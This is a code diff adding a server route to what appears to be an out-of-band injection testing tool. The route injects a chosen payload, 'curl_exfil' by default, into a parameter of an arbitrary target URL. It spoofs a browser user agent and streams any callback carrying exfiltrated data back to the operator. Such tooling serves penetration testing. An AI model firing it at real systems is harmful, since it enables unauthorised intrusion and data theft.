@@ -456,4 +456,131 @@ router.get("/oob/dns-sessions/stream", (req: Request, res: Response) => {
   });
 });
 
+/* ── GET /oob/activate/stream — SSE per-token live callback status ───── */
+router.get("/oob/activate/stream", async (req: Request, res: Response) => {
+  const q             = req.query as Record<string, string>;
+  const targetUrl     = q["targetUrl"]   ?? "";
+  const payloadType   = q["payloadType"] ?? "curl_exfil";
+  const injectParam   = q["injectParam"] ?? "q";
+  const method        = (q["method"] ?? "GET").toUpperCase() === "POST" ? "POST" : "GET";
+  const reqToken      = q["token"]       ?? "";
+  const timeoutSec    = Math.min(Math.max(parseInt(q["timeout"] ?? "60", 10), 10), 180);
+
+  if (!targetUrl) {
+    res.status(400).json({ error: "targetUrl is required" });
+    return;
+  }
+
+  let parsedUrl: URL;
+  try { parsedUrl = new URL(targetUrl); }
+  catch { res.status(400).json({ error: "Invalid targetUrl — must be a full URL with scheme" }); return; }
+
+  const token    = reqToken || generateToken();
+  const cbBase   = getOobCbBase(req as Parameters<typeof getOobCbBase>[0]);
+  const payloads = buildPolymorphicPayloads(cbBase, token);
+  const payload  = payloads[payloadType] ?? payloads["curl_exfil"] ?? "";
+  const cbUrl    = `${cbBase}/${token}`;
+
+  res.setHeader("Content-Type",      "text/event-stream");
+  res.setHeader("Cache-Control",     "no-cache");
+  res.setHeader("Connection",        "keep-alive");
+  res.setHeader("X-Accel-Buffering", "no");
+  res.flushHeaders();
+
+  function sse(event: string, data: unknown): void {
+    try { res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`); } catch { /* client gone */ }
+  }
+
+  sse("init", { token, cbUrl, payload, payloadType, targetUrl, method, injectParam, timeoutSec });
+
+  let statusCode: number | null = null;
+  let responseBody               = "";
+  let fireStatus: "sent" | "error" | "timeout" = "sent";
+  let errorMsg:   string | undefined;
+  const t0 = Date.now();
+
+  try {
+    let fetchUrl:  string;
+    let fetchInit: RequestInit;
+    if (method === "POST") {
+      fetchUrl  = targetUrl;
+      fetchInit = {
+        method:  "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        },
+        body:   `${encodeURIComponent(injectParam)}=${encodeURIComponent(payload)}`,
+        signal: AbortSignal.timeout(12_000),
+      };
+    } else {
+      const u = new URL(parsedUrl.toString());
+      u.searchParams.set(injectParam, payload);
+      fetchUrl  = u.toString();
+      fetchInit = {
+        method:  "GET",
+        headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" },
+        signal:  AbortSignal.timeout(12_000),
+      };
+    }
+    const r = await fetch(fetchUrl, fetchInit);
+    statusCode   = r.status;
+    const ct     = r.headers.get("content-type") ?? "";
+    if (ct.includes("text") || ct.includes("json")) {
+      responseBody = (await r.text()).slice(0, 512);
+    }
+  } catch (err) {
+    const e = err as Error;
+    if (e.name === "TimeoutError" || e.name === "AbortError") {
+      fireStatus = "timeout";
+      errorMsg   = "Target request timed out after 12s — target may be filtering or slow";
+    } else {
+      fireStatus = "error";
+      errorMsg   = e.message;
+    }
+  }
+
+  const fireMs = Date.now() - t0;
+  log.info({ targetUrl, payloadType, token: token.slice(0, 8), fireStatus, statusCode, fireMs }, "oob: activate/stream fired");
+  sse("fired", { status: fireStatus, statusCode, responseMs: fireMs, responseBody, error: errorMsg });
+
+  const deadline = Date.now() + timeoutSec * 1_000;
+  let resolved   = false;
+
+  const onHit = (hit: OobHit) => {
+    if (hit.token !== token) return;
+    resolved = true;
+    const decoded = hit.decodedData ?? (hit.data ? (() => {
+      try {
+        const d = Buffer.from(hit.data, "base64").toString("utf8");
+        return /^[\x09\x0a\x0d\x20-\x7e]+$/.test(d) && d.length > 2 ? d : hit.data;
+      } catch { return hit.data; }
+    })() : "");
+    sse("callback", { hit, decodedData: decoded, elapsed: Date.now() - t0 });
+    cleanup();
+    try { res.end(); } catch { /* gone */ }
+  };
+
+  oobEvents.on("hit", onHit);
+
+  const countdown = setInterval(() => {
+    if (resolved) { clearInterval(countdown); return; }
+    const remaining = Math.max(0, Math.round((deadline - Date.now()) / 1_000));
+    sse("waiting", { remaining, elapsed: Math.round((Date.now() - t0) / 1_000), token });
+    if (remaining <= 0) {
+      resolved = true;
+      sse("timeout", { token, elapsed: Math.round((Date.now() - t0) / 1_000) });
+      cleanup();
+      try { res.end(); } catch { /* gone */ }
+    }
+  }, 1_000);
+
+  function cleanup(): void {
+    clearInterval(countdown);
+    oobEvents.off("hit", onHit);
+  }
+
+  req.on("close", () => { if (!resolved) cleanup(); });
+});
+
 export default router;
